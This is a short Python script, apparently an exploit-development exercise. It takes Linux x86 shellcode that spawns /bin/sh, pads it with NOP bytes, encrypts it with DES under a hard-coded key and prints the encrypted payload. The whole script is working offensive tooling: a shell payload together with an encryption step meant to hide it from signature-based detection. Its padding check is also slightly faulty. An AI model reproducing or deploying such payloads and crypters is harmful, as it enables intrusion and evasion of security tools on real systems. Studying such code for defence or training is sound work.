#!/bin/python

from Crypto.Cipher import DES
import socket
import sys
import urllib


shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80"
print(shellcode)

print(" ")
print("Length of the shellcode is "+str(len(shellcode)))
print("Original Shellcode ")

enc1 = ""

for i in bytearray(shellcode):
 enc1+="0x"
 enc1+= "%02x," %(i & 0xff)

print("----------------------")
print(enc1.rstrip(','))



if ((len(shellcode)/8)==0):
 print("boo no padding is required")
else:
 padding = 8 * ((len(shellcode)/8)+1) - len(shellcode)
 shellcode = shellcode + "\x90"*padding
 print("Padding needed , appended  "+str(padding)+"""  \\x90 bytes""")
 
print(len(shellcode))

cipher = DES.new("aaaaaaaa")
encrypted_data = cipher.encrypt(shellcode)

enc2 = ""
output= ""

for i in bytearray(encrypted_data):
 enc2+="0x"
 enc2+= "%02x," %(i & 0xff)
 output += "\\x"
 output += '%02x'% i

print("Encrypted Shellcode")
print("----------------------")
print(enc2.rstrip(','))

print(output)

